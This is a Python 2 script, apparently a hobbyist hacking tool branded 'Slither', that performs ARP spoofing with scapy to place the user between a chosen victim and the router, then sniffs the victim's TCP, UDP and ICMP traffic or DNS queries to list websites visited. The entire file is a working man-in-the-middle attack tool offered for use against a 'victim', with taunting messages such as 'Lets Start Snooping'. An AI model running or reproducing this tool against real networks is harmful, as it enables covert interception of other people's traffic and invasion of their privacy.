try:
	from scapy.all import *
	import sys 
	import os
	import time
	import threading
	from threading import Thread
	from colorama import *
	import subprocess
	def shell(cmd):
		subprocess.call(cmd, shell=True)
except:
	pip = raw_input("Do you have colorama installed? --> ")
	if "Yes" in pip or "yes" in pip or "y" in pip or "Y" in pip:
	  print "ok"
	if "No" in pip or "no" in pip or "n" in pip or "N" in pip:
	  os1 = raw_input("What OS? Centos or Debian? --> ")
	  if "debian" in os1 or "Debian" in os1:
	    shell("sudo apt install python-pip")
	    shell("sudo pip install colorama")
	  if "centos" in os1 or "Centos" in os1 or "CentOS" in os1 or "centOS" in os1:
 	   shell("yum install python-pip -y")
 	   shell("pip install colorama")
 


x1 = Style.BRIGHT + Fore.CYAN + "  		  _____ _ _ _   _  				" + Style.RESET_ALL             
x2 = Style.BRIGHT + Fore.CYAN + " 		 / ____| (_) | | |              	" + Style.RESET_ALL 
x3 = Style.BRIGHT + Fore.CYAN + " 		| (___ | |_| |_| |__   ___ _ __ 	" + Style.RESET_ALL 
x4 = Style.BRIGHT + Fore.CYAN + " 		 \___ \| | | __| '_ \ / _ \ '__|	" + Style.RESET_ALL 
x5 = Style.BRIGHT + Fore.CYAN + " 		 ____) | | | |_| | | |  __/ |   	" + Style.RESET_ALL 
x6 = Style.BRIGHT + Fore.CYAN + " 		|_____/|_|_|\__|_| |_|\___|_|   	" + Style.RESET_ALL 
x12 = Style.BRIGHT + Fore.RED + "		   @yourv3nom - instagram        " + Style.RESET_ALL
x7 = Style.BRIGHT + Fore.CYAN + "1.) Show Incoming Network Traffic  	" + Style.RESET_ALL 
x8 = Style.BRIGHT + Fore.CYAN + "2.) Show Websites Client is Visiting  	" + Style.RESET_ALL 
x9 = Style.BRIGHT + Fore.RED + "More Will Be Added in Version 2.0!" + Style.RESET_ALL 
x10 = Style.BRIGHT + Fore.RED + "MITM Established, Lets Start Snooping ;)" + Style.RESET_ALL
x13 = Style.BRIGHT + Fore.RED + "Restoring Targets" + Style.RESET_ALL
x14 = Style.BRIGHT + Fore.RED + "Disabling IP Forwarding.." + Style.RESET_ALL
x15 = Style.BRIGHT + Fore.RED + "Shutting Down.." + Style.RESET_ALL
x16 = Style.BRIGHT + Fore.RED + "You Requested Shutdown.." + Style.RESET_ALL
x17 = Style.BRIGHT + Fore.RED + "Enabling IP Forwarding.." + Style.RESET_ALL
x18 = Style.BRIGHT + Fore.RED + "Sniffing Traffic.." + Style.RESET_ALL
x19 = Style.BRIGHT + Fore.RED + "Couldnt Find the Victim MAC Address" + Style.RESET_ALL
x20 = Style.BRIGHT + Fore.RED + "Couldnt Find the Gateway MAC Address" + Style.RESET_ALL
x21 = Style.BRIGHT + Fore.RED + "What do you want to do to the user? --> " + Style.RESET_ALL
x22 = Style.BRIGHT + Fore.CYAN + "ICMP Request: " + Style.RESET_ALL
x23 = Style.BRIGHT + Fore.CYAN + "ICMP Reply: " + Style.RESET_ALL
x24 = Style.BRIGHT + Fore.GREEN + "TCP: " + Style.RESET_ALL
x25 = Style.BRIGHT + Fore.YELLOW + "UDP: " + Style.RESET_ALL
x26 = Style.BRIGHT + Fore.RED + "IPV6: " + Style.RESET_ALL
x27 = Style.BRIGHT + Fore.CYAN + "Website: " + Style.RESET_ALL

 
def yourv3nom(pkt):
	global victimIP
	if pkt.haslayer("UDP"):
		if victimIP in pkt[IP].src or victimIP in pkt[IP].dst:
			print x25 + pkt[IP].src + " --> " + pkt[IP].dst
	if pkt.haslayer("TCP"):
		if victimIP in pkt[IP].src or victimIP in pkt[IP].dst:
			print x24 + pkt[IP].src + " --> " + pkt[IP].dst 
	if pkt.haslayer("ICMP"):			
		if "8" in str(pkt.getlayer(ICMP).type):
			print x22 + pkt[IP].src + " --> " + pkt[IP].dst
   		   	print x23 + pkt[IP].dst + " --> " + pkt[IP].src

def dns(pkt):
	global victimIP
	if IP in pkt:
		if victimIP in pkt[IP].src or victimIP in pkt[IP].dst:
			ip_src = pkt[IP].src
       	  	ip_dst = pkt[IP].dst
       	  	if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
       	           print x27 + pkt.getlayer(DNS).qd.qname 
   
def main():
	if "1" in select:
		sniff(iface = interface, prn=yourv3nom)    
	if "2" in select:
		sniff(iface = interface, filter = "port 53", prn=dns, store = 0)      

def venom():
		print x1
		print x2
		print x3
		print x4
		print x5
		print x6
		print x12
		print "\n"

def options():
	os.system("clear")
	venom()
	print "\n" + x7
	print x8
	print "\n" + x9 + "\n"

try: 	
		os.system("clear")
		venom()
		interface = raw_input("What interface are we using? --> ")
		victimIP = raw_input("Whats the Victims IP? --> ")
		gateIP = raw_input("Whats the Router IP? --> ")
except KeyboardInterrupt: 
		print "\n" + x16
		print x15
		sys.exit()

print "\n" + x17 + "\n"
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def get_mac(IP):
		conf.verb = 0
		ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
		for snd, rcv in ans:
				return rcv.sprintf(r"%Ether.src%")

def reARP():
		print "\n" + x13
		victimMAC = get_mac(victimIP)
		gateMAC = get_mac(gateIP)
		send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
		send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateMAC), count = 7)
		print x14
		os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
		print x15
		sys.exit(1)

def troll(gm, vm):
		send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst= vm), count = 3)
		send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst= gm), count = 3)

def attack():
		try:
				victimMAC = get_mac(victimIP)
		except Exception:
				os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
				print x19
				print x15
				sys.exit(1)
		try:
				gateMAC = get_mac(gateIP)
		except Exception:
				os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
				print x20
				print x15
				sys.exit(1)
		os.system("clear")
		venom()
		print "\n" + x10
		print x18 + "\n"
		while 1:
				try:
						troll(gateMAC, victimMAC)
						time.sleep(1.5) 
				except KeyboardInterrupt:
						reARP()
						break
options()

a = threading.Thread(target = attack)
a.daemon = True
b = threading.Thread(target = main)
b.daemon = True

try:
		select = raw_input(x21)
except KeyboardInterrupt:
		print "\n" + x16
		print x15
		sys.exit(1)


if "__main__" in __name__:
	try:
		a.start()
		b.start()
		while True:
			time.sleep(1.5)
	except KeyboardInterrupt:
		print "\n" + x15

